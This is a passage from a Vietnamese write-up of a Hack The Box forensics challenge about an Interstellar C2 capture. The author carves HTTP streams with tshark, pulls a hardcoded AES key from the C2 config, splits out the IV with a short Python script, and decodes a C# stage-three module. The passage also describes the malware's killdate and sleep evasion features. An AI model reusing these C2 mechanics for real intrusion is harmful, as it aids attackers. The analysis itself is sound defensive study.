eQp6BPCjdxj4/u4sBao4ST+mvo8rAEh3kxTiqgCoL1KCTkj6t4UcFV0Bu7F0/QNR1IQemtEzQAAAAABJRU5ErkJggg==","iVBORw0KGgoAAAANSUhEUgAAABoAAAAaCAMAAACelLz8AAAAXVBMVEWnp6f///8rLi3p6en8/Py9vb2wsLC6urrLy8vS0tLv7+/W1tY0NzaYmJh5enouMTBmaGc6PDuEhISjo6OLi4udnp1BREN+f35PUlFxcnJZW1pMTk5cXl2RkZE3OjlmWTrgAAAA2ElEQVQokX2S2xKDIAxEIwgq4gUVq7b0/z+zQMCB6rgv0ZyRXUOgCBIt4wCctSJ2AAtlcIrRBJU1ZKrLiMoK/lSViK4EmUX1ldgzHaJ3BIBa5LN1+D5/pDy6aXE5CxCutShkB3F6O2RB48pEZG+L9oRIjxrw5+mBkHU3BlGPfw7cW40k0csjjvYmJcRkUbeEfGOTh9TDicYIcOSzOonUEGI0wW3NQ7jwIjzpYLdHJ4GDWsYNvdQUCYvjnQ41DGrr52y8D5fydJUPC/C0Nm7Zkg8rmu3h3Yr+ANAgB/2vh2bMAAAAAElFTkSuQmCC","iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAA+VBMVEX////p6en6+vr29va8vLzq3MWkgFPt38rv7+/g4ODJycnj4+Pl173g0LSZZir59/XYx6WohlvNroXw4sqjdDu2mG3NvJMRDhPTw53Cq4LZ2dmSXR7by6zRv5r06Netj2fXy7ugd0SQWRnKt5DBpXnk18O8uLOnnpG1qJm+o32ZaC9ucHWQkpael43Yw6etg062mZiumHthYWXYxKjUxLDTz8nm1LG5n32ojW2tnoq9mm4wLjJUUlQnJSheV065r6NrY1eDg4aSZzXIt6AfGxzCn3N8WzU1KR+BViRQNxt6ZUqsi4RBMTHJtbWfeGgdDQ22jlyqfUW8n4zo5IpYAAACJ0lEQVQ4ja2T63uaMBjFQQwXTWhCkEYTik7t0Hbi1FrFrje1u7gL9v//Y/ZCfdR2+7Rn54s8nJ8nyXmDpv1HnUyuzULR5OStV7pmYPTG6AxkDXosMtmydOzXKGlzay8epilzDkCTEUIwQmBBgGUhhEknPWQ0mcqBIqEAOOco9NYsKh378/vlyyJcffv6xc08yCgI2wwBUPFqvnoBBo+fn1au9Lw0M2GVUtSjOTBe4gkCWShptbaPPkSkmc8MCBBUYUWVhTAIoXaWKuL5rl8AuqazHBAUnXFMciLNQihjDGukSQEUCaFC/BkXm80yZT1znsh1dgBIoLD262dAFKFJkv7QbnFbptnWnwEwqwtKlNp8B0BBRrJN4HnoSwhoxbZm39XyNfDZZkNo3iUn2WA4HEiZ+H3WMDSjYdYpzXc3zf2i6bXrutL1+2asQ1H6ORAE6qe4ADgcty6ldN3WRwiAUTpACAspGBfvdptdmBTpvJOyFVXsYhYGEG0FVRH04eLy8uI9hj13ZJ9V9N04DSdmJgUAL0YPD6ObqaJUmOyuur8yRqPMYKdqevtpdLO4n1Ih6rOyYxxujOHMewJOS1enp4sBpWFQi6tHPhDQRigonSoF/w+DILp65WulKxYEQShEkggBT4I5pddANerA+6C39YvfWqS/ufj2uVmDvrw09Wi7HrFdBccRlfks/2ryD2QW7ys4IvRGpbxTpfGnn5/E1neyjb/Y/6zfsC5Em3hFDfYAAAAASUVORK5CYII="49395491SGMI
```
</details>

Ở đây mình sẽ thấy được 1 chuỗi danh sách các uri gần lớn mà malware được nhận, sau đó là killdate -> Tự động kill để evasion trong hệ thống -> Sleep để tránh bị quét bởi các hệ thống giám sát. Và quan trọng nhất là regrex NEWKEY để lấy key cứng mới:

```
Key AES new: nUbFDDJadpsuGML4Jxsq58nILvjoNu76u4FIHVGIKSQ=
```
Sau đó mình tiếp tục tới tcp stream 5 để tiếp tục download file module mà malware đã GET về từ server C2:

```                                                                                                                                         
┌──(nhduydeptrai㉿tobi)-[/mnt/…/CTF/HACK_THE_BOX/Challenge/Interstellar C2]
└─$ tshark -r capture.pcapng -Y "tcp.stream eq 5" -T fields -e http.file_data | xxd -r -p  > dVfhJmc2ciKvPOC.bin

```
Sau đó tiếp tục dùng script python nhỏ để lấy ra IV sau đó mình lên cyberchef decrypt phần ciphertext còn lại:
```
from pathlib import Path
import base64

key_b64 = "nUbFDDJadpsuGML4Jxsq58nILvjoNu76u4FIHVGIKSQ="

with open("dVfhJmc2ciKvPOC.bin", "rb") as f:
    encoded = "".join(f.read().decode("ascii").split())

ciphertext = base64.b64decode(encoded)
encrypted = ciphertext[16:]
iv = ciphertext[:16]

print("IV:", iv.hex())
print(f"IV length: {len(iv)} bytes")

print(f"Encrypted length: {len(encrypted)} bytes")
with open("dVfhJmc2ciKvPOC_decrypted.bin", "wb") as f:
    f.write(encrypted)
```

<img width="3080" height="1377" alt="image" src="https://github.com/user-attachments/assets/7c5542c3-163c-422a-8f89-8ea2a990bc41" />

Tới đây mình thấy phần output bắt đầu bằng strings `multicmd00031loadmodule` -> giống như bên trong source của dropper mình đã phân tích, và đây sẽ là 2 file module làm các công việc cho stage3 tiếp theo

Giờ mình chỉ cần decode base64 để nó hiện ra được đây là file module1.bin của stage3 -> với header MZ ở signature bytes:

<img width="3076" height="1382" alt="image" src="https://github.com/user-attachments/assets/edb22a58-2ab5-4a58-b211-1d02841e66b3" />

Mình thực hiện detect nó bằng **DIE**, thì có được con này được viết bằng ngôn ngữ C# luôn, và nó có tên trên Virustotal là `Core.exe`

<img width="1096" height="797" alt="image" src="https://github.com/user-attachments/assets/57f84336-adb6-43dc-993b-2af4b296de58" />

Giờ mình tiếp tục phân tích qua con này bên trong dnspy:

